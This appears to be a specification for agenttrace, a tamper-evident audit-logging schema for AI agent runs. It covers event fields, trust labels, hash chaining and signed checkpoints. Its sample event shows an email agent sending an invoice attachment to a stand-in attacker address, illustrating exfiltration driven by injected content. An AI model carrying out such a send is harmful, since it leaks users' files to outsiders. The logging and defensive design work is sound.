# Event schema (v1)

Status: **Draft v0.1** · Machine-readable form:
[`schema/event.schema.json`](https://github.com/Ashiii27/agenttrace/blob/main/schema/event.schema.json),
[`schema/checkpoint.schema.json`](https://github.com/Ashiii27/agenttrace/blob/main/schema/checkpoint.schema.json)

## 1. Event

```json
{
  "schema": "agenttrace/v1",
  "session_id": "s_01JD7Q8K2M",
  "seq": 42,
  "ts": "2026-11-13T10:15:02.123Z",
  "type": "tool.call",
  "actor": "email-agent",
  "content_ref": "sha256:9f2c…",
  "inputs": ["sha256:ab12…", "sha256:77e0…"],
  "trust": "untrusted",
  "attrs": {
    "gen_ai.tool.name": "send_email",
    "args": { "to": "attacker@evil.test", "attachment": "invoice-2026-11.pdf" }
  },
  "prev_hash": "c41d…",
  "hash": "e803…"
}
```

| Field | Meaning |
|---|---|
| `schema` | Always `agenttrace/v1` for this version |
| `session_id` | One agent run. Each session has its own chain |
| `seq` | Starts at 0, increases by exactly 1 per event |
| `ts` | Agent-side time (RFC 3339, UTC). Not trusted for ordering — `seq` is |
| `type` | See §2 |
| `actor` | Agent or sub-agent name |
| `content_ref` | Hash of this event's own content (prompt, output, tool result) in the blob store |
| `inputs` | Segment hashes that were in context when this event was produced |
| `trust` | See §3 |
| `attrs` | Type-specific attributes; use OpenTelemetry `gen_ai.*` names where one exists |
| `prev_hash`, `hash` | See §4 |

## 2. Event types

| Type | Emitted when |
|---|---|
| `session.start` | Agent run begins; `attrs` holds agent version, model, tool schemas |
| `user.input` | A human message enters the agent |
| `llm.request` | A model call is made; `inputs` lists every segment in the context window |
| `llm.response` | The model answers; `content_ref` is the full response |
| `tool.call` | The agent invokes a tool; `inputs` holds the `llm.response` that asked for it |
| `tool.result` | The tool returns; the result becomes a new segment |
| `retrieval` | Documents are fetched from a vector store or search |
| `chain.break` | Collector-generated: an ingested event did not chain correctly |
| `session.end` | Agent run ends |

## 3. Trust labels

| Label | Source |
|---|---|
| `system` | Developer-authored: system prompt, tool schemas |
| `user` | The human operating the agent |
| `untrusted` | Anything else: web, email, files, tool outputs, retrieved documents |

Propagation: an `llm.response` takes the **lowest** trust among its `inputs`
(`untrusted` < `user` < `system`).

## 4. Hash chain

```text
genesis    = SHA256("agenttrace/v1:genesis:" || session_id)
hash_i     = SHA256(prev_hash_i || JCS(event_i without "hash"))
prev_hash_0 = genesis
prev_hash_i = hash_(i-1)
```

- `JCS` is the JSON Canonicalization Scheme (RFC 8785), so the same event always produces the same
  bytes regardless of key order or whitespace.
- Hashes are lowercase hex. `prev_hash` is hashed as its 32 raw bytes, not as hex text.
- Content is **not** inside the event — only its `content_ref`. Because blobs are content-addressed,
  editing a blob changes its hash and breaks the reference.
- Redaction happens **before** content is hashed ([threat model G4](threat_model.md#2-guarantees)).
  A secret becomes `[REDACTED:<type>:<tag>]`, where `tag` is the first 8 hex characters of an
  HMAC-SHA256 of the secret under a per-session key that is never stored.
- Test vectors that pin these rules, including canonical-JSON edge cases, are in
  [`schema/test-vectors/chain-v1.json`](https://github.com/Ashiii27/agenttrace/blob/main/schema/test-vectors/chain-v1.json).
  Any implementation (the Go collector included) must reproduce them exactly.

### Segments

Content is stored as segments, one per message, document or tool output
([ADR-0006](adr/0006-message-segments.md)). A message segment is
`JCS({"role", "content"[, "tool_calls": [{"name", "args"}]]})` with roles `system`, `user`,
`assistant` and `tool`. A tool result is stored as a `tool` message segment, so it has the same
`content_ref` as the matching message in the next `llm.request`.

## 5. Checkpoint

Signed by the collector, never by the agent.

```json
{
  "schema": "agenttrace/v1/checkpoint",
  "session_id": "s_01JD7Q8K2M",
  "seq": 49,
  "head_hash": "5b7a…",
  "received_at": "2026-11-13T10:15:07.004Z",
  "key_id": "collector-2026-11",
  "sig": "base64(Ed25519(JCS(checkpoint without \"sig\")))"
}
```

`verify` recomputes the chain from genesis, checks every checkpoint's signature and `head_hash`,
and reports each event as **verified** (at or before a valid checkpoint), **unsealed** (after the last
one), or **broken** (with the first failing `seq`).

## 6. Versioning

A change to any rule in §4 or §5 is a new schema version (`agenttrace/v2`) and needs an ADR.
Adding an optional field or a new event type is a minor change and only needs this page updated.
